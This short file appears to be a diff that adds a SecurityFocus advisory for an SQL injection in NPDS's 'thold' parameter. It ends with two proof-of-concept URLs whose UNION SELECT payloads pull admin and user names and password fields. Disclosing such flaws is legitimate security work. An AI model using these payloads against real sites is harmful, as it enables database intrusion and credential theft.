@@ -1,0 +1,14 @@
+source: http://www.securityfocus.com/bid/13649/info
+
+NPDS is prone to an SQL injection vulnerability.
+
+This issue is due to a failure in the application to properly sanitize user-supplied input to the 'thold' parameter.
+
+Successful exploitation could result in a compromise of the application, disclosure or modification of data, or may permit an attacker to exploit vulnerabilities in the underlying database implementation.
+
+All versions are considered to be vulnerable at the moment.
+
+
+http://www.example.com/npds/comments.php?thold=0%20UNION%20SELECT%200,0,0,0,0,0,0,0,aid,pwd,0,0%20FROM%20authors
+
+http://www.example.com/npds/comments.php?thold =0%20UNION%20SELECT%200,0,0,0,0,0,0,0,uname,pass,0,0%20FROM%20users
